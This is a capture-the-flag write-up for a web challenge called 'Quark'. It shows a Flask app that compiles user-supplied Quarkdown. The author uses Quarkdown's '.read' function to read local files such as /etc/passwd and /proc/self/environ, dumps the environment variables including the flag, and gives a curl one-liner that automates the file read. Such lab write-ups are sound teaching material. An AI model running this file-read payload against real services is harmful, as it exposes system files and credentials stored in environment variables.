---
layout: post
title:  "Quark"
date:   2025-11-16 22:39:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /platypwn-quark/
---

**Title**: Quark

**Category**: Web

**Description**: What happens when you mix LaTeX and Markdown? Could that be secure? Is it utterly broken, cause LaTeX? Well, time to find out!

I get the challenge files. Here is `app.py`:
```python
from flask import Flask, request, render_template_string, send_file  
import tempfile  
import subprocess  
import os  
import sys  
  
if not os.getenv("FLAG"):  
    print("Missing FLAG. Challenge is broken.")  
    sys.exit(1)  
  
app = Flask(__name__)  
  
FORM_HTML = """  
<!doctype html>  
<html>  
 <head><title>Quarkdown to HTML</title></head>  
 <body>  
   <h1>Quarkdown to HTML</h1>  
   <form method="post">  
     <textarea name="source" rows="15" cols="80" placeholder="Enter Quarkdown here..."></textarea><br><br>  
     <button type="submit">Render HTML</button>  
   </form>  
 </body>  
</html>  
"""  
  
@app.route("/", methods=["GET", "POST"])  
def index():  
    if request.method == "POST":  
        source = request.form.get("source", "")  
            if not source.strip():  
                return "No input provided", 400  
  
        with tempfile.TemporaryDirectory() as tmpdir:  
            qk_file = os.path.join(tmpdir, "input.qk")  
            html_file = os.path.join(tmpdir, "output/index.html")  
  
            with open(qk_file, "w") as f:  
                f.write(source)  
  
            subprocess.run(["quarkdown", "c", qk_file, "--out", tmpdir, "--out-name", "output"], check=True)  
  
            return send_file(html_file, as_attachment=True, download_name="output.html")  
  
    return render_template_string(FORM_HTML)  
  
  
if __name__ == "__main__":  
    app.run(host="0.0.0.0", port=5000)
```

I visit the site at `http://10.80.9.240:5000/` and as expected I see `# Quarkdown to HTML` and can input text to render.

I look at the Quarkdown docs found a blog at [https://www.quarkdown.net/blog/4](https://www.quarkdown.net/blog/4). I find I can do `.read {/etc/passwd}` for example to read a file.

I render `.read {/proc/self/environ}` and download `output.html`:
```html
<!DOCTYPE html>  
<!--suppress ALL -->  
<html>  
<head>  
   <meta charset="UTF-8">  
   <title>Quarkdown</title>  
   <script src="script/quarkdown.js"></script>  
   <script>const capabilities = window.quarkdownCapabilities</script>  
   <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>  
   <link rel="stylesheet" href="theme/theme.css">  
  
   <style>  
  
        body {  
        }  
  
        .page-break {  
            break-before: always;  
        }  
  
        .quarkdown-plain .page-break {  
            break-before: avoid;  
            break-after: avoid;  
        }  
  
        body.quarkdown-plain {  
        }  
  
        body.quarkdown-slides .reveal {  
        }  
  
        @page {  
            size: auto auto;  
            margin: 0;  
        }  
  
        p {  
        }  
    </style>  
    <script>  
        const doc = new PlainDocument();  
        prepare(doc);  
    </script>  
</head>  
<body class="quarkdown quarkdown-plain">  
<aside id="margin-area-left" class="margin-area"></aside>  
<main>  
   <p>KUBERNETES_SERVICE_PORT=443KUBERNETES_PORT=tcp://10.80.0.1:443HOSTNAME=quarkdown-deployment-7759cbf58b-r7h7bSHLVL=0HOME=/rootGPG_KEY=7169605F62C751356D054A26A821E680E5FA6305LC_CTYPE=C.UTF-8PYTHON_SHA256=ed5ef34cda36cfa2f3a340f07cac7e7814f91c7f3c411f6d3562323a866c5c66WERKZEUG_SERVER_FD=3QD_NO_SANDBOX=trueKUBERNETES_PORT_443_TCP_ADDR=10.80.0.1  
PATH=/opt/quarkdown/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpPYTHON_VERSION=3.13.9KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.80.0.1:443JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64PWD=/appKUBERNETES_SERVICE_HOST=10.80.0.1FLAG=PP{4ctu411y_n0t_4s_br0k3n_4s_1_th0ught::r2EmJlw4QgLA}</p>  
</main>  
<aside id="margin-area-right" class="margin-area"></aside>  
</body>  
</html>
```

One liner:
```shell
curl -s -X POST 'http://10.80.10.43:5000/' -d 'source=.read {/proc/self/environ}' | tr '\0' '\n' | grep 'PP{'  
FLAG=PP{4ctu411y_n0t_4s_br0k3n_4s_1_th0ught::r2EmJlw4QgLA}
```

`PP{4ctu411y_n0t_4s_br0k3n_4s_1_th0ught::r2EmJlw4QgLA}`